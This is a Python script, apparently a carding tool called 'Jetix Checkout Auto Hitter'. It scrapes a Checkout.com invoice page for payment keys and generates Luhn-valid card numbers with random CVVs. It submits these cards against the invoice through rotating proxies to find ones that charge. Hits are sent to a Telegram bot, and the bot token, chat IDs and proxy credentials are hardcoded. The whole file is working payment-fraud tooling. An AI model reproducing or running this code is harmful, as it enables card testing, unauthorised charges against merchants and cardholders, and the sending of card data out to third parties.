import requests
import random
import json
import time
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Step 1: Get a random User-Agent
ua = UserAgent()
user_agent = ua.random

# Default values for Telegram token and ID
default_token = "5929089968:AAGQnjv4tL97xzyzbBAi8DonZTRTIGTNZ1k"
default_id = "-1001843526677"
default_d_id = "-1002110161593"

# Default proxy details
default_proxy = "p.webshare.io:80:ivsjktvx-rotate:6e2kjmousxs9"

# User input for proxy details
input_proxy = input("Enter Proxy (hostname:port:username:password)").strip()
proxy_details = input_proxy or default_proxy  # Use default proxy if input is empty

# Function to format proxy URL
def format_proxy(proxy):
    hostname, port, username, password = proxy.split(":")
    return f"http://{username}:{password}@{hostname}:{port}"

# Function to check if the proxy is working
def check_proxy(proxy_url):
    try:
        response = requests.get("https://api.ipify.org/", proxies={"http": proxy_url, "https": proxy_url}, timeout=5)
        return response.status_code == 200
    except:
        return False

# Reformat the proxy URL
proxy_url = format_proxy(proxy_details)

# Check if the proxy is working
proxy_working = check_proxy(proxy_url)
if proxy_working:
    proxies = {"http": proxy_url, "https": proxy_url}
    print("Proxy is working. Running with proxy.")
else:
    proxies = None
    print("Proxy is not working. Running without proxy.")


# The user input invoice and card details
invoice = input('Enter Invoice URL: ').strip()

start_time = time.time()  # Measure the start time

# Function to calculate Luhn digit
def calculate_luhn_digit(number):
    sum_ = 0
    flip = True
    for digit in reversed(number):
        digit = int(digit)
        if flip:
            digit *= 2
            if digit > 9:
                digit -= 9
        sum_ += digit
        flip = not flip
    return (10 - (sum_ % 10)) % 10

# Enhanced credit card generator that follows Luhn's algorithm
def generate_credit_card(bin_cc, count):
    cards = []
    for _ in range(count):
        card_number = bin_cc
        # Determine the length based on the first digit of BIN
        if bin_cc[0] == "3":  # American Express
            card_length = 15
        else:
            card_length = 16

        # Generate the remaining card number, excluding the check digit
        while len(card_number) < card_length - 1:
            card_number += str(random.randint(0, 9))

        # Calculate the Luhn check digit and append it to the card number
        check_digit = calculate_luhn_digit(card_number)
        full_card_number = card_number + str(check_digit)
        cards.append(full_card_number)
    return cards

# Generate random CVV and expiration date
def generate_cvv_and_expiry(bin_cc):
    # Adjust CVV length based on card type (AMEX has 4 digits)
    cvv_length = 4 if bin_cc[0] == "3" else 3
    cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
    rand_month = random.randint(1, 12)
    mes = f"{rand_month:02}"
    ano = random.randint(2025, 2039)
    return cvv, mes, ano

# Step 2: Make a GET request to the provided URL with specific headers
url = invoice
headers = {
    "User-Agent": user_agent,
    "Pragma": "no-cache",
    "Accept": "*/*"
}

response = requests.get(url, headers=headers, proxies=proxies)
source = response.text

# Helper function to extract JSON data from the source
def extract_json(source):
    start_token = '<script id="__NEXT_DATA__" type="application/json">'
    end_token = '</script>'
    try:
        start_index = source.index(start_token) + len(start_token)
        end_index = source.index(end_token, start_index)
        json_data = source[start_index:end_index]
        return json.loads(json_data)
    except ValueError:
        return None

# Helper function to extract email and name from the HTML content
def extract_email_and_name(source):
    soup = BeautifulSoup(source, "html.parser")
    info_container = soup.find('div', class_="PersonalInformationRowstyle__TextContainer-sc-aibun9-2")
    if info_container:
        text_content = info_container.get_text(strip=True)
        name, email = text_content.split(', ')
        return name, email
    return None, None

# Process JSON to extract and print relevant information
def process_json(response_source):
    json_data = extract_json(response_source)
    if json_data:
        # Extract paymentPageContextSerialized
        page_props = json_data.get('props', {}).get('pageProps', {})
        payment_context_serialized = page_props.get('paymentPageContextSerialized')

        if payment_context_serialized:
            payment_data = json.loads(payment_context_serialized)
            # Try to extract key information from the JSON if available
            mname = payment_data.get('display_name') or payment_data.get('merchant', {}).get('name', 'Unknown Merchant')
            products = payment_data.get('products', [])
            
            if products:
                pname = products[0].get('name', 'Unknown Product')
                quantity = products[0].get('quantity', 1)
                price = payment_data.get('amount') / 100 if payment_data.get('amount') else None
            else:
                pname = "Unknown Product"
                quantity = 1
                price = None

            currency = payment_data.get('currency', 'Unknown Currency')
            status = payment_data.get('status', 'Unknown Status')
            email = payment_data.get('customer', {}).get('email', 'Unknown Email')
            success_url = payment_data.get('success_url', 'Unknown Success URL')
            cancel_url = payment_data.get('metadata', {}).get('cancel_url', 'Unknown Cancel URL')
            pk = payment_data.get('pk', 'Unknown PK')
            ps = payment_data.get('payment_session', {}).get('id', 'Unknown PS')

            # Print extracted variables
            print(f"Merchant Name = {mname}")
            print(f"Product Name = {pname}")
            print(f"Quantity = {quantity}")
            print(f"Price = {price} {currency}")
            print(f"Status = {status}")
            print(f"Customer Email = {email}")
            print(f"Success URL = {success_url}")
            print(f"Back URL = {cancel_url}")
            print()

            return pk, ps, mname, pname, quantity, price, email, currency, status
        else:
            print("Failed to extract paymentPageContextSerialized from the JSON data.")
    else:
        # If JSON isn't available, fall back to scraping the email and name from HTML
        name, email = extract_email_and_name(response_source)
        if name and email:
            print(f"Extracted Name: {name}")
            print(f"Extracted Email: {email}")
            return None, None, name, "Unknown Product", 1, None, email, "Unknown Currency", "Unknown Status"
        else:
            print("Failed to extract any valid information.")
            print()
    
    return None, None, None, None, None, None, None, None, None

# Run the process_json function and get the public key (pk) and payment session (ps)
pk, ps, mname, pname, quantity, price, email, currency, status = process_json(source)

if pk and ps:
    # Enter BIN and generate cards
    default_BIN = "476516206143"
    input_BIN = input(f'Enter BIN (at least 6 digits): (default {default_BIN}) ').strip()
    BIN_CC = input_BIN or default_BIN  # Use default BIN if input is empty
    num_cards = int(input('Number of cards to generate (default 6): ') or 6)
    print()
    cards_list = generate_credit_card(BIN_CC, num_cards)

    for card_number in cards_list:
        # Generate random CVV and expiration date for each card
        cvv, mes, ano = generate_cvv_and_expiry(BIN_CC)

        # Tokenization request
        token_url = "https://api.checkout.com/tokens"
        token_headers = {
            'Content-Type': 'application/json',
            'Authorization': pk,
            'User-Agent': user_agent,
            'Pragma': 'no-cache',
            'Accept': '*/*'
        }
        token_data = {
            "type": "card",
            "number": card_number,
            "expiry_month": mes,
            "expiry_year": ano,
            "cvv": cvv,
            "phone": {},
            "preferred_scheme": "",
            "requestSource": "JS"
        }

        try:
            token_response = requests.post(token_url, headers=token_headers, json=token_data, proxies=proxies)
            token_json = token_response.json()
            # print(f"Token response: {token_json}")

            if "card_number_invalid" in token_json.get('error_codes', []):
                print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} is Invalid!")
                print()
            else:
                token = token_json.get('token')
                bin_info = token_json.get('bin')
                scheme = token_json.get('scheme')
                card_type = token_json.get('card_type')
                card_category = token_json.get('card_category')
                bank = token_json.get('issuer')

                # print(f"Card {card_number}:")
                # print(f"Token = {token}")
                # print(f"BIN = {bin_info}")
                # print(f"Scheme = {scheme}")
                # print(f"Card Type = {card_type}")
                # print(f"Card Category = {card_category}")
                # print(f"Bank = {bank}")

                # Submit payment request for each card
                submit_url = f"https://api.checkout.com/payment-sessions/{ps}/submit"
                submit_headers = {
                    'Content-Type': 'application/json',
                    'Authorization': pk,
                    'User-Agent': user_agent,
                    'Pragma': 'no-cache',
                    'Accept': '*/*'
                }
                submit_data = {
                    "type": "card",
                    "card_metadata": {"bin": bin_info},
                    "source": {"token": token}
                }

                submit_response = requests.post(submit_url, headers=submit_headers, json=submit_data, proxies=proxies)
                submit_json = submit_response.json()
                # print(f"Submit response: {submit_json}")

                if "payment_attempts_exceeded" in submit_json.get('error_codes', []):
                    print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} Invoice is Voided!")
                    print()
                elif "card_expired" in submit_json.get('error_codes', []):
                    print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} Your card is Expired!")
                    print()
                elif "rate_limit_exceeded" in submit_json.get('error_codes', []):
                    print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} Invoice is Rate Limited!")
                    print()
                elif submit_json.get('status') == 'Declined':
                    print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} Declined due to Banned IP/Mail/Card!")
                    print()
                else:
                    status = submit_json.get('status')
                    print(f"Status = {status}")

                    # Parse URL from submit response
                    action = submit_json.get('action', {})
                    url = action.get('url')
                    if url:
                        url_response = requests.get(url, headers=headers, proxies=proxies)
                        url_source = url_response.text

                        # Parse TransactionId and SessionId from response
                        transactionId = url_source.split("transactionId: '")[1].split("',")[0]
                        sessionId = url_source.split("sessionId: '")[1].split("',")[0]

                        # Request to device-information
                        device_info_url = f"https://authentication-devices.checkout.com/sessions-interceptor/{sessionId}/device-information"
                        device_info_data = {
                            'threeDSServerTransID': transactionId,
                            'threeDSCompInd': 'Y',
                            'browserScreenWidth': 1920,
                            'browserScreenHeight': 1080,
                            'browserColorDepth': 24,
                            'browserUserAgent': user_agent,
                            'browserLanguage': 'en-US',
                            'browserJavaEnabled': 'false',
                            'browserTZ': -360
                        }
                        device_info_response = requests.post(device_info_url, headers=headers, data=device_info_data, proxies=proxies)
                        device_info_text = device_info_response.text

                        if "3DS2 Challenge" in device_info_text:
                            print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} OTP CC!")
                            print()
                        else:
                            # Request to payment
                            payment_url = f"https://api.checkout.com/3ds/{sessionId}"
                            payment_response = requests.get(payment_url, headers=headers, proxies=proxies)
                            payment_text = payment_response.text
                            execution_time = time.time() - start_time
                            print(f"Execution Time: {execution_time:.2f} seconds")

                            # Parse redirect_url from response
                            if "RedirectReason: '" in payment_text:
                                redirect_reason = payment_text.split("RedirectReason: '")[1].split("'")[0]
                            else:
                                redirect_reason = "Unknown"
                                print("RedirectReason not found in payment_text")

                            if "window.top.location.replace('" in payment_text:    
                                redirect_url = payment_text.split("window.top.location.replace('")[1].split("')")[0]
                            else:
                                redirect_url = "Unknown"
                                print("Redirect URL not found in payment_text")

                            print(f"Redirect Reason: {redirect_reason}")
                            print(f"Redirect URL: {redirect_url}")

                            if "RedirectReason: 'success'" in payment_text:
                                print(f"⚡ CHARGED CC: {card_number}|{mes}|{ano}|{cvv} [ Thanks For Using Jetix Checkout Auto Hitter ]")
                                message = f'𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n𝐂𝐚𝐫𝐝: <code>{card_number}|{mes}|{ano}|{cvv}</code>\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Checkout Auto Hitter\n𝐏𝐫𝐢𝐜𝐞 ⇾ {price} {currency}\n\n𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭 𝐍𝐚𝐦𝐞: {mname}\n\n𝐏𝐫𝐨𝐝𝐮𝐜𝐭 𝐍𝐚𝐦𝐞: {pname}\n\n𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫 𝐄𝐦𝐚𝐢𝐥: {email}\n\n𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {scheme} {card_type} {card_category}\n\n𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\nBy: <a href="tg://user?id=548699498">𝙋𝙞𝙖𝙨𝙝 🇧🇩</a>'
                                requests.post(
                                    f"https://api.telegram.org/bot{default_token}/sendMessage?chat_id={default_id}&text={message}&parse_mode=HTML"
                                )
                                print()
                            else:
                                print(f"💀 DEAD CC: {card_number}|{mes}|{ano}|{cvv} is [ GENERIC DECLINED ]")
                                dmessage = f'𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n𝐂𝐚𝐫𝐝: <code>{card_number}|{mes}|{ano}|{cvv}</code>\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Checkout Auto Hitter\n𝐏𝐫𝐢𝐜𝐞 ⇾ {price} {currency}\n\n𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭 𝐍𝐚𝐦𝐞: {mname}\n\n𝐏𝐫𝐨𝐝𝐮𝐜𝐭 𝐍𝐚𝐦𝐞: {pname}\n\n𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫 𝐄𝐦𝐚𝐢𝐥: {email}\n\n𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {scheme} {card_type} {card_category}\n\n𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\nBy: <a href="tg://user?id=548699498">𝙋𝙞𝙖𝙨𝙝 🇧🇩</a>'
                                requests.post(
                                    f"https://api.telegram.org/bot{default_token}/sendMessage?chat_id={default_d_id}&text={dmessage}&parse_mode=HTML"
                                )
                                print()

        except requests.exceptions.RequestException as e:
            print(f"Submit payment request failed: {e}")
            print()

else:
    print("Public key (pk) or payment session (ps) is not available, cannot proceed to tokenization.")
    print()
# At the end of your script, add this line
time.sleep(5)  # Hold the console open for 5 seconds
